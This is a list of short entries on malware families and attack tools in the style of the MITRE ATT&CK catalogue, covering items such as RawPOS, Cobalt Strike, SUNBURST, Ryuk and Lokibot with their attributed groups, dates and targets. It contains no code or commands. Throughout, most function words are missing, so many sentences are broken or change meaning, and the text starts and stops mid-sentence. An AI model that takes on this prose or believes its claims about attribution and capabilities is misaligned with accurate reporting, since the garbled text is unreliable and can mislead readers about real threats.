(POS) malware family searches cardholder data victims. 2008. (Citation: Kroll RawPOS Jan 2017) (Citation: TrendMicro RawPOS April 2015) (Citation: Visa RawPOS March 2015) FireEye divides RawPOS components: FIENDCRY, DUEBREW, DRIFTWOOD. (Citation: Mandiant FIN5 GrrCON Oct 2016) (Citation: DarkReading FireEye FIN5 Oct 2015) [Sibot](https://attack.mitre.org/software/S0589) dual-purpose malware written VBScript designed achieve persistence compromised download execute additional payloads. discovered [Sibot](https://attack.mitre.org/software/S0589) variants 2021 investigation [APT29](https://attack.mitre.org/groups/G0016) SolarWinds cyber intrusion campaign.(Citation: MSTIC NOBELIUM Mar 2021) [ZxxZ](https://attack.mitre.org/software/S1013) trojan written Visual C++ [BITTER](https://attack.mitre.org/groups/G1002) August 2021, including Bangladeshi government personnel.(Citation: Cisco Talos Bitter Bangladesh 2022) [Tarrask](https://attack.mitre.org/software/S1011) malware [HAFNIUM](https://attack.mitre.org/groups/G0125) August 2021. [Tarrask](https://attack.mitre.org/software/S1011) designed evade digital defenses maintain persistence generating concealed scheduled tasks.(Citation: Tarrask scheduled task) [WINDSHIELD](https://attack.mitre.org/software/S0155) signature backdoor [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 2017) [Drovorub](https://attack.mitre.org/software/S0502) Linux malware toolset comprised agent, client, server, kernel modules, [APT28](https://attack.mitre.org/groups/G0007).(Citation: NSA/FBI Drovorub August 2020) [Shark](https://attack.mitre.org/software/S1019) backdoor malware written C# .NET updated version [Milan](https://attack.mitre.org/software/S1015); [HEXANE](https://attack.mitre.org/groups/G1001) July 2021.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021) [Bazar](https://attack.mitre.org/software/S0534) downloader backdoor April 2020, infections professional services, healthcare, manufacturing, IT, logistics travel companies Europe. [Bazar](https://attack.mitre.org/software/S0534) reportedly ties [TrickBot](https://attack.mitre.org/software/S0266) campaigns deploy additional malware, including ransomware, steal sensitive data.(Citation: Cybereason Bazar July 2020) [Kobalos](https://attack.mitre.org/software/S0641) multi-platform backdoor Linux, FreeBSD, Solaris. [Kobalos](https://attack.mitre.org/software/S0641) deployed profile targets, including high-performance computers, academic servers, endpoint security vendor, internet service provider; Europe, North America, Asia. [Kobalos](https://attack.mitre.org/software/S0641) identified late 2019.(Citation: ESET Kobalos Feb 2021)(Citation: ESET Kobalos Jan 2021) [BadPatch](https://attack.mitre.org/software/S0337) Windows Trojan Gaza Hackers-linked campaign.(Citation: Unit 42 BadPatch Oct 2017) [MESSAGETAP](https://attack.mitre.org/software/S0443) data mining malware family deployed [APT41](https://attack.mitre.org/groups/G0096) telecommunications networks monitor save SMS traffic specific phone numbers, IMSI numbers, specific keywords. (Citation: FireEye MESSAGETAP October 2019) [RATANKBA](https://attack.mitre.org/software/S0241) remote controller tool [Lazarus Group](https://attack.mitre.org/groups/G0032). [RATANKBA](https://attack.mitre.org/software/S0241) attacks targeting financial institutions Poland, Mexico, Uruguay, United Kingdom, Chile. organizations telecommunications, management consulting, technology, insurance, aviation, education. [RATANKBA](https://attack.mitre.org/software/S0241) graphical user interface attacker issue jobs perform infected machines. (Citation: Lazarus RATANKBA) (Citation: RATANKBA) [SUGARDUMP](https://attack.mitre.org/software/S1042) proprietary browser credential harvesting tool UNC3890 [C0010](https://attack.mitre.org/campaigns/C0010) campaign. [SUGARDUMP](https://attack.mitre.org/software/S1042) version 2021, SMTP C2 version late 2021-early 2022, C2 variant April 2022.(Citation: Mandiant UNC3890 Aug 2022) [SOUNDBITE](https://attack.mitre.org/software/S0157) signature backdoor [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 2017) [BADCALL](https://attack.mitre.org/software/S0245) Trojan malware variant [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT BADCALL) [hcdLoader](https://attack.mitre.org/software/S0071) remote access tool (RAT) [APT18](https://attack.mitre.org/groups/G0026). (Citation: Dell Lateral Movement) [Nidiran](https://attack.mitre.org/software/S0118) custom backdoor developed [Suckfly](https://attack.mitre.org/groups/G0039). delivered strategic compromise. (Citation: Symantec Suckfly March 2016) [MoonWind](https://attack.mitre.org/software/S0149) remote access tool (RAT) 2016 target organizations Thailand. (Citation: Palo Alto MoonWind March 2017) [Ryuk](https://attack.mitre.org/software/S0446) ransomware designed target enterprise environments attacks 2018. [Ryuk](https://attack.mitre.org/software/S0446) shares code similarities Hermes ransomware.(Citation: CrowdStrike Ryuk January 2019)(Citation: FireEye Ryuk Trickbot January 2019)(Citation: FireEye FIN6 Apr 2019) [Cryptoistic](https://attack.mitre.org/software/S0498) backdoor, written Swift, [Lazarus Group](https://attack.mitre.org/groups/G0032).(Citation: SentinelOne Lazarus macOS July 2020) [HermeticWiper](https://attack.mitre.org/software/S0697) data wiper 2022, Ukraine additional activity observed Latvia Lithuania. sectors targeted include government, financial, defense, aviation, services.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Symantec Ukraine Wipers February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: ESET Hermetic Wiper February 2022)(Citation: Qualys Hermetic Wiper March 2022) [ABK](https://attack.mitre.org/software/S0469) downloader [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) 2019.(Citation: Trend Micro Tick November 2019) [Pysa](https://attack.mitre.org/software/S0583) ransomware October 2018 target high-value finance, government healthcare organizations.(Citation: CERT-FR PYSA April 2020) [Wiper](https://attack.mitre.org/software/S0041) family destructive malware March 2013 breaches South Korean banks media companies. (Citation: Dell Wiper) [Final1stspy](https://attack.mitre.org/software/S0355) dropper family deliver [DOGCALL](https://attack.mitre.org/software/S0213).(Citation: Unit 42 Nokki Oct 2018) [ccf32](https://attack.mitre.org/software/S1043) data collection malware February 2019, notably [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign; x64 version.(Citation: Bitdefender FunnyDream Campaign November 2020) [Zebrocy](https://attack.mitre.org/software/S0251) Trojan [APT28](https://attack.mitre.org/groups/G0007) November 2015. malware programming language variants, including C++, Delphi, AutoIt, C#, VB.NET, Golang. (Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: CISA Zebrocy Oct 2020)  [Pandora](https://attack.mitre.org/software/S0664) multistage kernel rootkit backdoor functionality [Threat Group-3390](https://attack.mitre.org/groups/G0027) 2020.(Citation: Trend Micro Iron Tiger April 2021) [FinFisher](https://attack.mitre.org/software/S0182) government-grade commercial surveillance spyware reportedly sold exclusively government agencies targeted lawful criminal investigations. heavily obfuscated multiple anti-analysis techniques. variants including [Wingbird](https://attack.mitre.org/software/S0176). (Citation: FinFisher Citation) (Citation: SIR 21) (Citation: FireEye FinSpy Sept 2017) (Citation: Securelist BlackOasis Oct 2017) (Citation: FinFisher March 2018) [SpeakUp](https://attack.mitre.org/software/S0374) Trojan backdoor targets Linux OSX devices. observed January 2019. (Citation: CheckPoint SpeakUp Feb 2019) [CrossRAT](https://attack.mitre.org/software/S0235) cross platform RAT. [OwaAuth](https://attack.mitre.org/software/S0072) credential stealer deployed Exchange servers appears exclusively [Threat Group-3390](https://attack.mitre.org/groups/G0027). (Citation: Dell TG-3390) [Cadelspy](https://attack.mitre.org/software/S0454) backdoor [APT39](https://attack.mitre.org/groups/G0087).(Citation: Symantec Chafer Dec 2015) [Cobalt Strike](https://attack.mitre.org/software/S0154) commercial, full-featured, remote access tool bills “adversary simulation software designed execute targeted attacks emulate post-exploitation actions advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover range ATT&CK tactics, executed single, integrated system.(Citation: cobaltstrike manual)

In addition capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages capabilities well-known tools Metasploit [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual) [SUNBURST](https://attack.mitre.org/software/S0559) trojanized DLL designed fit SolarWinds Orion software update framework. [APT29](https://attack.mitre.org/groups/G0016) February 2020.(Citation: SolarWinds Sunburst Sunspot Update January 2021)(Citation: Deep Dive Solorigate January 2021) [EvilBunny](https://attack.mitre.org/software/S0396) C++ malware sample observed 2011 designed execution platform Lua scripts.(Citation: Cyphort EvilBunny Dec 2014) [Wingbird](https://attack.mitre.org/software/S0176) backdoor appears version commercial software [FinFisher](https://attack.mitre.org/software/S0182). reportedly attack individual computers networks. [NEODYMIUM](https://attack.mitre.org/groups/G0055) 2016 campaign. (Citation: SIR 21) (Citation: NEODYMIUM Dec 2016) [Cobian RAT](https://attack.mitre.org/software/S0338) backdoor, remote access tool observed 2016.(Citation: Zscaler Cobian Aug 2017) [HotCroissant](https://attack.mitre.org/software/S0431) remote access trojan (RAT) attributed U.S. government entities malicious North Korean government cyber activity, tracked collectively HIDDEN COBRA.(Citation: US-CERT HOTCROISSANT February 2020) [HotCroissant](https://attack.mitre.org/software/S0431) shares numerous code similarities [Rifdoor](https://attack.mitre.org/software/S0433).(Citation: Carbon Black HotCroissant April 2020) [ServHelper](https://attack.mitre.org/software/S0382) backdoor observed late 2018. backdoor written Delphi typically delivered DLL file.(Citation: Proofpoint TA505 Jan 2019) [JCry](https://attack.mitre.org/software/S0389) ransomware written Go. identified #OpJerusalem 2019 campaign.(Citation: Carbon Black JCry 2019) [Unknown Logger](https://attack.mitre.org/software/S0130) publicly released, backdoor. Version 1.5 backdoor actors responsible MONSOON campaign. (Citation: Forcepoint Monsoon) [REvil](https://attack.mitre.org/software/S0496) ransomware family linked [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) operated ransomware-as-a-service (RaaS) April 2019. [REvil](https://attack.mitre.org/software/S0496), organizations manufacturing, transportation, electric sectors, highly configurable shares code similarities GandCrab RaaS.(Citation: Secureworks REvil September 2019)(Citation: Intel 471 REvil March 2020)(Citation: IB Ransomware 2020) [RIPTIDE](https://attack.mitre.org/software/S0003) proxy-aware backdoor [APT12](https://attack.mitre.org/groups/G0005). (Citation: Moran 2014) [Valak](https://attack.mitre.org/software/S0476) multi-stage modular malware function standalone stealer downloader, observed 2019 targeting enterprises Germany.(Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020) [PinchDuke](https://attack.mitre.org/software/S0048) malware [APT29](https://attack.mitre.org/groups/G0016) 2008 2010. (Citation: F-Secure Dukes) [Milan](https://attack.mitre.org/software/S1015) backdoor implant based [DanBot](https://attack.mitre.org/software/S1014) written Visual C++ .NET. [Milan](https://attack.mitre.org/software/S1015) [HEXANE](https://attack.mitre.org/groups/G1001) June 2020.(Citation: ClearSky Siamesekitten August 2021)(Citation: Kaspersky Lyceum October 2021) [USBStealer](https://attack.mitre.org/software/S0136) malware [APT28](https://attack.mitre.org/groups/G0007) 2005 extract air-gapped networks. capability communicate Internet conjunction [ADVSTORESHELL](https://attack.mitre.org/software/S0045). (Citation: ESET Sednit USBStealer 2014) (Citation: Kaspersky Sofacy) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) MacOS backdoor variants [APT32](https://attack.mitre.org/groups/G0050).(Citation: TrendMicro MacOS April 2018)(Citation: Trend Micro MacOS Backdoor November 2020) [CCBkdr](https://attack.mitre.org/software/S0222) malware injected signed version CCleaner distributed CCleaner's distribution website. (Citation: Talos CCleanup 2017) (Citation: Intezer Aurora Sept 2017) [OnionDuke](https://attack.mitre.org/software/S0052) malware [APT29](https://attack.mitre.org/groups/G0016) 2013 2015. (Citation: F-Secure Dukes) [Taidoor](https://attack.mitre.org/software/S0011) remote access trojan (RAT) Chinese government cyber actors maintain access victim networks.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [Taidoor](https://attack.mitre.org/software/S0011) Taiwanese government organizations 2010.(Citation: TrendMicro Taidoor) [SHIPSHAPE](https://attack.mitre.org/software/S0028) malware developed [APT30](https://attack.mitre.org/groups/G0013) propagation exfiltration data removable devices. [APT30](https://attack.mitre.org/groups/G0013) capability exfiltrate data air-gaps. (Citation: FireEye APT30) [Cherry Picker](https://attack.mitre.org/software/S0107) sale (PoS) memory scraper. (Citation: Trustwave Cherry Picker) [SUPERNOVA](https://attack.mitre.org/software/S0578) in-memory written .NET C#. discovered November 2020 investigation [APT29](https://attack.mitre.org/groups/G0016)'s SolarWinds cyber operation determined unrelated. Subsequent analysis suggests [SUPERNOVA](https://attack.mitre.org/software/S0578) China-based threat SPIRAL.(Citation: Guidepoint SUPERNOVA Dec 2020)(Citation: Unit42 SUPERNOVA Dec 2020)(Citation: SolarWinds Advisory Dec 2020)(Citation: CISA Supernova Jan 2021)(Citation: Analyzing Solorigate Dec 2020) [P2P ZeuS](https://attack.mitre.org/software/S0016) closed-source fork leaked version ZeuS botnet. improvements leaked version, including peer-to-peer architecture. (Citation: Dell P2P ZeuS) [Kivars](https://attack.mitre.org/software/S0437) modular remote access tool (RAT), derived Bifrost RAT, [BlackTech](https://attack.mitre.org/groups/G0098) 2010 campaign.(Citation: TrendMicro BlackTech June 2017) [CaddyWiper](https://attack.mitre.org/software/S0693) destructive data wiper attacks organizations Ukraine March 2022.(Citation: ESET CaddyWiper March 2022)(Citation: Cisco CaddyWiper March 2022) [Cyclops Blink](https://attack.mitre.org/software/S0687) modular malware widespread campaigns [Sandworm Team](https://attack.mitre.org/groups/G0034) 2019 target Small/Home Office (SOHO) network devices, including WatchGuard Asus.(Citation: NCSC Cyclops Blink February 2022)(Citation: NCSC CISA Cyclops Blink Advisory February 2022)(Citation: Trend Micro Cyclops Blink March 2022) [PoisonIvy](https://attack.mitre.org/software/S0012) popular remote access tool (RAT) groups.(Citation: FireEye Poison Ivy)(Citation: Symantec Elderwood Sept 2012)(Citation: Symantec Darkmoon Aug 2005) [Seasalt](https://attack.mitre.org/software/S0345) malware linked [APT1](https://attack.mitre.org/groups/G0006)'s 2010 operations. shares code similarities [OceanSalt](https://attack.mitre.org/software/S0346).(Citation: Mandiant APT1 Appendix)(Citation: McAfee Oceansalt Oct 2018) [NativeZone](https://attack.mitre.org/software/S0637) collectively disposable custom [Cobalt Strike](https://attack.mitre.org/software/S0154) loaders [APT29](https://attack.mitre.org/groups/G0016) 2021.(Citation: MSTIC Nobelium Toolset 2021)(Citation: SentinelOne NobleBaron June 2021) [NanoCore](https://attack.mitre.org/software/S0336) modular remote access tool developed .NET spy victims steal information. threat actors 2013.(Citation: DigiTrust NanoCore Jan 2017)(Citation: Cofense NanoCore Mar 2018)(Citation: PaloAlto NanoCore Feb 2016)(Citation: Unit 42 Gorgon Aug 2018) [TajMahal](https://attack.mitre.org/software/S0467) multifunctional spying framework 2014. [TajMahal](https://attack.mitre.org/software/S0467) comprised separate packages, named Tokyo Yokohama, deploy 80 plugins.(Citation: Kaspersky TajMahal April 2019) [PLEAD](https://attack.mitre.org/software/S0435) remote access tool (RAT) downloader [BlackTech](https://attack.mitre.org/groups/G0098) targeted attacks East Asia including Taiwan, Japan, Hong Kong.(Citation: TrendMicro BlackTech June 2017)(Citation: JPCert PLEAD Downloader June 2018) [PLEAD](https://attack.mitre.org/software/S0435) referred [TSCookie](https://attack.mitre.org/software/S0436), reporting separation two. [PLEAD](https://attack.mitre.org/software/S0435) observed March 2017.(Citation: JPCert TSCookie March 2018)(Citation: JPCert PLEAD Downloader June 2018) [Daserf](https://attack.mitre.org/software/S0187) backdoor spy steal Japanese, South Korean, Russian, Singaporean, Chinese victims. Researchers identified versions written Visual Delphi. (Citation: Trend Micro Daserf Nov 2017) (Citation: Secureworks BRONZE BUTLER Oct 2017) [GoldFinder](https://attack.mitre.org/software/S0597) custom tracer tool written logs route packet takes compromised network C2 server. inform  threat actors potential discovery logging actions, including C2 malware. [GoldFinder](https://attack.mitre.org/software/S0597) discovered 2021 investigation SolarWinds cyber intrusion [APT29](https://attack.mitre.org/groups/G0016).(Citation: MSTIC NOBELIUM Mar 2021) [Carbon](https://attack.mitre.org/software/S0335) sophisticated, second-stage backdoor framework steal sensitive victims. [Carbon](https://attack.mitre.org/software/S0335) selectively [Turla](https://attack.mitre.org/groups/G0010) target government foreign affairs-related organizations Central Asia.(Citation: ESET Carbon Mar 2017)(Citation: Securelist Turla Oct 2018) [LoJax](https://attack.mitre.org/software/S0397) UEFI rootkit [APT28](https://attack.mitre.org/groups/G0007) persist remote access software targeted systems.(Citation: ESET LoJax Sept 2018) [Cardinal RAT](https://attack.mitre.org/software/S0348) volume remote access trojan (RAT) observed December 2015. [Cardinal RAT](https://attack.mitre.org/software/S0348) notable unique utilization uncompiled C# source code Windows built-in csc.exe compiler.(Citation: PaloAlto CardinalRat Apr 2017) [DanBot](https://attack.mitre.org/software/S1014) first-stage remote access Trojan written C# [HEXANE](https://attack.mitre.org/groups/G1001) 2018.(Citation: SecureWorks August 2019) [BISCUIT](https://attack.mitre.org/software/S0017) backdoor [APT1](https://attack.mitre.org/groups/G0006) 2007. (Citation: Mandiant APT1) [Calisto](https://attack.mitre.org/software/S0274) macOS Trojan backdoor compromised machine. [Calisto](https://attack.mitre.org/software/S0274) believed developed 2016. (Citation: Securelist Calisto July 2018) (Citation: Symantec Calisto July 2018) [Pisloader](https://attack.mitre.org/software/S0124) malware family notable DNS C2 protocol anti-analysis tactics. [APT18](https://attack.mitre.org/groups/G0026) malware family, [HTTPBrowser](https://attack.mitre.org/software/S0070), group. (Citation: Palo Alto DNS Requests) [GoldenSpy](https://attack.mitre.org/software/S0493) backdoor malware packaged legitimate tax preparation software. [GoldenSpy](https://attack.mitre.org/software/S0493) discovered targeting organizations China, delivered "Intelligent Tax" software suite produced Golden Tax Department Aisino Credit required pay local taxes.(Citation: Trustwave GoldenSpy June 2020)  [Gold Dragon](https://attack.mitre.org/software/S0249) Korean-language, data gathering implant observed wild South Korea July 2017. [Gold Dragon](https://attack.mitre.org/software/S0249) [Brave Prince](https://attack.mitre.org/software/S0252) [RunningRAT](https://attack.mitre.org/software/S0253) operations targeting organizations 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon) [RGDoor](https://attack.mitre.org/software/S0258) malicious Internet Services (IIS) backdoor developed C++ language. [RGDoor](https://attack.mitre.org/software/S0258) deployed webservers belonging Middle East government organizations. [RGDoor](https://attack.mitre.org/software/S0258) backdoor access compromised IIS servers. (Citation: Unit 42 RGDoor Jan 2018) [Ramsay](https://attack.mitre.org/software/S0458) stealing malware framework designed collect exfiltrate sensitive documents, including air-gapped systems. Researchers identified overlaps [Ramsay](https://attack.mitre.org/software/S0458) [Darkhotel](https://attack.mitre.org/groups/G0012)-associated Retro malware.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020) [FakeM](https://attack.mitre.org/software/S0076) shellcode-based Windows backdoor [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016) [Carberp](https://attack.mitre.org/software/S0484) credential stealing malware active 2009. [Carberp](https://attack.mitre.org/software/S0484)'s source code leaked online 2013, subsequently foundation [Carbanak](https://attack.mitre.org/software/S0030) backdoor.(Citation: Trend Micro Carberp February 2014)(Citation: KasperskyCarbanak)(Citation: RSA Carbanak November 2017) [HARDRAIN](https://attack.mitre.org/software/S0246) Trojan malware variant reportedly North Korean government. (Citation: US-CERT HARDRAIN March 2018) [Pillowmint](https://attack.mitre.org/software/S0517) point-of-sale malware [FIN7](https://attack.mitre.org/groups/G0046) designed capture credit card information.(Citation: Trustwave Pillowmint June 2020) [TrailBlazer](https://attack.mitre.org/software/S0682) modular malware [APT29](https://attack.mitre.org/groups/G0016) 2019.(Citation: CrowdStrike StellarParticle January 2022) [Revenge RAT](https://attack.mitre.org/software/S0379) freely remote access tool written .NET (C#).(Citation: Cylance Shaheen Nov 2018)(Citation: Cofense RevengeRAT Feb 2019) [MacMa](https://attack.mitre.org/software/S1016) macOS-based backdoor set functionalities control exfiltrate files compromised computer. [MacMa](https://attack.mitre.org/software/S1016) observed wild November 2021.(Citation: ESET DazzleSpy Jan 2022) [FunnyDream](https://attack.mitre.org/software/S1044) backdoor multiple components [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign 2019, execution exfiltration.(Citation: Bitdefender FunnyDream Campaign November 2020) [SUNSPOT](https://attack.mitre.org/software/S0562) implant injected [SUNBURST](https://attack.mitre.org/software/S0559) backdoor SolarWinds Orion software update framework. [APT29](https://attack.mitre.org/groups/G0016) February 2020.(Citation: CrowdStrike SUNSPOT Implant January 2021)  [More_eggs](https://attack.mitre.org/software/S0284) JScript backdoor [Cobalt Group](https://attack.mitre.org/groups/G0080) [FIN6](https://attack.mitre.org/groups/G0037). based variable "More_eggs" code. versions backdoor used, version 2.0 version 4.4. (Citation: Talos Cobalt July 2018)(Citation: Security Intelligence Eggs Aug 2019) [SysUpdate](https://attack.mitre.org/software/S0663) backdoor written C++ [Threat Group-3390](https://attack.mitre.org/groups/G0027) 2020.(Citation: Trend Micro Iron Tiger April 2021) [TinyZBot](https://attack.mitre.org/software/S0004) bot written C# developed [Cleaver](https://attack.mitre.org/groups/G0003). (Citation: Cylance Cleaver) [OutSteel](https://attack.mitre.org/software/S1017) file uploader document stealer developed scripting language AutoIT [Ember Bear](https://attack.mitre.org/groups/G1003) March 2021.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [BackConfig](https://attack.mitre.org/software/S0475) custom Trojan flexible plugin architecture [Patchwork](https://attack.mitre.org/groups/G0040).(Citation: Unit 42 BackConfig 2020) [PowGoop](https://attack.mitre.org/software/S1046) loader consists DLL loader PowerShell-based downloader; [MuddyWater](https://attack.mitre.org/groups/G0069) main loader.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: CYBERCOM Iranian Intel Cyber January 2022) [Kwampirs](https://attack.mitre.org/software/S0236) backdoor Trojan [Orangeworm](https://attack.mitre.org/groups/G0071). machines software installed control high-tech imaging devices X-Ray MRI machines. (Citation: Symantec Orangeworm April 2018) [Nerex](https://attack.mitre.org/software/S0210) Trojan [Elderwood](https://attack.mitre.org/groups/G0066) backdoor compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Nerex 2012) [BoomBox](https://attack.mitre.org/software/S0635) downloader responsible executing stage components [APT29](https://attack.mitre.org/groups/G0016) 2021.(Citation: MSTIC Nobelium Toolset 2021) [PUNCHTRACK](https://attack.mitre.org/software/S0197) non-persistent sale (POS) malware utilized [FIN8](https://attack.mitre.org/groups/G0061) scrape payment card data. (Citation: FireEye Fin8 2016) (Citation: FireEye Enemy FIN8 Aug 2016) [Proton](https://attack.mitre.org/software/S0279) macOS backdoor focusing data theft credential access  (Citation: objsee mac malware 2017). [Trojan.Mebromi](https://attack.mitre.org/software/S0001) BIOS-level malware takes control victim MBR. (Citation: 2011) [InnaputRAT](https://attack.mitre.org/software/S0259) remote access tool exfiltrate files victim’s machine. [InnaputRAT](https://attack.mitre.org/software/S0259) wild 2016. (Citation: ASERT InnaputRAT April 2018) [Kessel](https://attack.mitre.org/software/S0487) advanced version OpenSSH acts custom backdoor, acting steal credentials function bot. [Kessel](https://attack.mitre.org/software/S0487) active C2 domain resolving August 2018.(Citation: ESET ForSSHe December 2018) [GrimAgent](https://attack.mitre.org/software/S0632) backdoor deployment [Ryuk](https://attack.mitre.org/software/S0446) ransomware 2020; [FIN6](https://attack.mitre.org/groups/G0037) [Wizard Spider](https://attack.mitre.org/groups/G0102).(Citation: IB GrimAgent July 2021) [LookBack](https://attack.mitre.org/software/S0582) remote access trojan written C++ utility companies July 2019. TALONITE activity observed [LookBack](https://attack.mitre.org/software/S0582).(Citation: Proofpoint LookBack Malware Aug 2019)(Citation: Dragos TALONITE)(Citation: Dragos Threat Report 2020) [Clop](https://attack.mitre.org/software/S0611) ransomware family observed February 2019 retail, transportation logistics, education, manufacturing, engineering, automotive, energy, financial, aerospace, telecommunications, professional legal services, healthcare, tech industries. [Clop](https://attack.mitre.org/software/S0611) variant CryptoMix ransomware.(Citation: Mcafee Clop Aug 2019)(Citation: Cybereason Clop Dec 2020)(Citation: Unit42 Clop April 2021)  [NetTraveler](https://attack.mitre.org/software/S0033) malware multiple cyber espionage campaigns basic surveillance victims. earliest samples timestamps 2005, largest observed samples created 2010 2013. (Citation: Kaspersky NetTraveler) [YAHOYAH](https://attack.mitre.org/software/S0388) Trojan [Tropic Trooper](https://attack.mitre.org/groups/G0081) second-stage backdoor.(Citation: TrendMicro TropicTrooper 2015) [Lokibot](https://attack.mitre.org/software/S0447) distributed stealer reported 2015. designed steal sensitive usernames, passwords, cryptocurrency wallets, credentials. [Lokibot](https://attack.mitre.org/software/S0447) create backdoor infected systems attacker install additional payloads.(Citation: Infoblox Lokibot January 2019)(Citation: Morphisec Lokibot April 2020)(Citation: CISA Lokibot September 2020) [CallMe](https://attack.mitre.org/software/S0077) Trojan designed Apple OSX. based publicly tool called Tiny SHell. (Citation: Scarlet Mimic Jan 2016) [ROCKBOOT](https://attack.mitre.org/software/S0112) [Bootkit](https://attack.mitre.org/techniques/T1542/003) unidentified, suspected China-based group. (Citation: FireEye Bootkits) [CloudDuke](https://attack.mitre.org/software/S0054) malware [APT29](https://attack.mitre.org/groups/G0016) 2015. (Citation: F-Secure Dukes) (Citation: Securelist Minidionis July 2015) [Egregor](https://attack.mitre.org/software/S0554) Ransomware-as-a-Service (RaaS) tool observed September 2020. Researchers code similarities [Egregor](https://attack.mitre.org/software/S0554) Sekhmet ransomware, [Maze](https://attack.mitre.org/software/S0449) ransomware.(Citation: NHS Digital Egregor Nov 2020)(Citation: Cyble Egregor Oct 2020)(Citation: Security Boulevard Egregor Oct 2020) [PoetRAT](https://attack.mitre.org/software/S0428) remote access trojan (RAT) identified April 2020. [PoetRAT](https://attack.mitre.org/software/S0428) multiple campaigns private public sectors Azerbaijan, including ICS SCADA systems energy sector. STIBNITE activity observed malware. [PoetRAT](https://attack.mitre.org/software/S0428) derived references code poet William Shakespeare. (Citation: Talos PoetRAT April 2020)(Citation: Talos PoetRAT October 2020)(Citation: Dragos Threat Report 2020) [CHOPSTICK](https://attack.mitre.org/software/S0023) malware family modular backdoors [APT28](https://attack.mitre.org/groups/G0007). 2012 dropped victims second-stage malware, first-stage malware cases. Windows Linux variants. (Citation: FireEye APT28) (Citation: ESET Sednit 2) (Citation: FireEye APT28 January 2017) (Citation: DOJ GRU Indictment Jul 2018) tracked separately [X-Agent Android](https://attack.mitre.org/software/S0314). [FELIXROOT](https://attack.mitre.org/software/S0267) backdoor target Ukrainian victims. (Citation: FireEye FELIXROOT July 2018) [ZxShell](https://attack.mitre.org/software/S0412) remote administration tool backdoor downloaded Internet, Chinese hacker websites. 2004.(Citation: FireEye APT41 Aug 2019)(Citation: Talos ZxShell Oct 2014) [NDiskMonitor](https://attack.mitre.org/software/S0272) custom backdoor written .NET appears unique [Patchwork](https://attack.mitre.org/groups/G0040). (Citation: TrendMicro Patchwork Dec 2017) [CoinTicker](https://attack.mitre.org/software/S0369) malicious application poses cryptocurrency price ticker installs components source backdoors EvilOSX EggShell.(Citation: CoinTicker 2019) [DDKONG](https://attack.mitre.org/software/S0255) malware sample campaign [Rancor](https://attack.mitre.org/groups/G0075). [DDKONG](https://attack.mitre.org/software/S0255) February 2017. (Citation: Rancor Unit42 June 2018) [Penquin](https://attack.mitre.org/software/S0587) remote access trojan (RAT) multiple versions [Turla](https://attack.mitre.org/groups/G0010) target Linux systems 2014.(Citation: Kaspersky Turla Penquin December 2014)(Citation: Leonardo Turla Penquin 2020) [BabyShark](https://attack.mitre.org/software/S0414) Visual Basic (VB) script-based malware family believed North Korean campaigns. (Citation: Unit42 BabyShark Feb 2019) [Cannon](https://attack.mitre.org/software/S0351) Trojan variants written C# Delphi. observed April 2018. (Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018) [CreepySnail](https://attack.mitre.org/software/S1024) custom PowerShell implant [POLONIUM](https://attack.mitre.org/groups/G1005) 2022.(Citation: POLONIUM June 2022) [build_downer](https://attack.mitre.org/software/S0471) downloader [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) 2019.(Citation: Trend Micro Tick November 2019) [Melcoz](https://attack.mitre.org/software/S0530) banking trojan family built source tool Remote Access PC. [Melcoz](https://attack.mitre.org/software/S0530) observed attacks Brazil 2018 spread Chile, Mexico, Spain, Portugal.(Citation: Securelist Brazilian Banking Malware July 2020) [Winnti Windows](https://attack.mitre.org/software/S0141) modular remote access Trojan (RAT) multiple carry intrusions regions 2010, including referred name, [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: Kaspersky Winnti April 2013)(Citation: Winnti Jan 2017)(Citation: Novetta Winnti April 2015)(Citation: 401 TRG Winnti Umbrella 2018). Linux variant tracked separately [Winnti Linux](https://attack.mitre.org/software/S0430).(Citation: Chronicle Winnti Linux 2019) [PowerPunch](https://attack.mitre.org/software/S0685) lightweight downloader [Gamaredon Group](https://attack.mitre.org/groups/G0047) 2021.(Citation: Actinium February 2022) [BONDUPDATER](https://attack.mitre.org/software/S0360) PowerShell backdoor [OilRig](https://attack.mitre.org/groups/G0049). observed November 2017 targeting Middle Eastern government organization, updated version observed August 2018 target government organization spearphishing emails.(Citation: FireEye APT34 Dec 2017)(Citation: Palo Alto OilRig Sep 2018) [BLACKCOFFEE](https://attack.mitre.org/software/S0069) malware Chinese 2013. (Citation: FireEye APT17) (Citation: FireEye Periscope March 2018) [Ebury](https://attack.mitre.org/software/S0377) SSH backdoor targeting Linux operating systems. Attackers require root-level access, replace SSH binaries (ssh, sshd, ssh-add, etc) modify shared library OpenSSH (libkeyutils).(Citation: ESET Ebury Feb 2014)(Citation: BleepingComputer Ebury March 2017)(Citation: ESET Ebury Oct 2017) [Kinsing](https://attack.mitre.org/software/S0599) Golang-based malware runs cryptocurrency miner attempts spread hosts victim environment. (Citation: Aqua Kinsing April 2020)(Citation: Sysdig Kinsing November 2020)(Citation: Aqua Security Cloud Native Threat 